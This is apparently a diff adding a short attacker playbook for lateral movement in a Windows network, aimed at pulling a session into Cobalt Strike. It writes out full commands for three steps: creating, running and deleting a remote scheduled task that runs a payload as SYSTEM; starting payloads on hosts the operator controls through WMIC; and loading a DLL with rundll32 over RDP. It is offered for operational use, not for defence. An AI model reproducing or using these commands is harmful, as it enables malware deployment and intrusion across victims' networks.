@@ -1,0 +1,23 @@
+Commands for payload start to pull session into cobalt
+1)shell SCHTASKS /s MS040926754153 /RU "SYSTEM" /create /tn "WindowsSensor15" /tr "cmd.exe /c C:\ProgramData\P32.exe" /sc ONCE /sd 01/01/1970 /st 00:00
+2)shell SCHTASKS /s MS040926754153 /run /TN "WindowsSensor15"
+3)shell schtasks /S MS040926754153 /TN "WindowsSensor15" /DELETE /F
+Instead of MS040926754153 insert IP/name of the workstation
+Run commands
+1) Payload task creation
+2) Run
+3) Delete
+
+Use WMIC
+1)If it is dll then run
+shell wmic /node:192.168.104.13 process call create "rundll32.exe C:\ProgramData\x64.dll StartW"
+
+Replace IP with the one we have access to and insert path to our .dll. Command syntax is quite easy to understand. 
+
+If you have RDP access > run cmd as administrator and run rundll32.exe C:\ProgramData\x64.dll,StartW with corresponding path to your dll
+
+For .exe or .bat also use WMIC 
+
+shell wmic /node:10.28.0.3 process call create "C:\ProgramData\j1.exe"
+
+Also it is possible to upload and run with Metasploit but we're barely using it now since it's not working correctly in recent versions
